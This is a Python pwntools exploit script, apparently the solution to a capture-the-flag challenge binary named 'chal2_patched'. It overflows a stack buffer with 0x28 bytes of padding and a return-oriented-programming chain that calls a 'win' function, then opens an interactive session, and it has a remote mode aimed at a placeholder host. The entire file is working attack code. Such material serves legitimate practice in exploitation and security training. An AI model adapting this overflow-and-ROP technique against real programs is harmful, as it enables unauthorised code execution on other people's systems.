#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal2_patched")

context.log_level = 'debug'
context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']
host = 'addr'
port = 1337

gdbscript = '''

'''


def conn():
    match args.TYPE:
        case 'REMOTE':
            r = remote(host, port)
        case 'DBG':
            r = gdb.debug([exe.path], gdbscript)
        case _:
            r = process([exe.path])

    return r


def main():
    r = conn()
    pop_rbx_rbp_r12_r15 = 0x40137a
    call_win = 0x401360
    ret = 0x4013a4

    rop  = pack(pop_rbx_rbp_r12_r15)
    rop += pack(0)                   # rbx
    rop += pack(0xdeadbeef)          # rbp
    rop += pack(0xcafe)              # r12
    rop += pack(0x1337)              # r13
    rop += pack(0xc0de)              # r14
    rop += pack(exe.sym['name'])     # r15
    rop += pack(ret)                 # ret
    rop += pack(call_win)

    r.sendlineafter(b"name> ", pack(exe.sym['win']))
    r.sendlineafter(b"input> ", b'a' * 0x28 + rop)

    r.interactive()


if __name__ == "__main__":
    main()
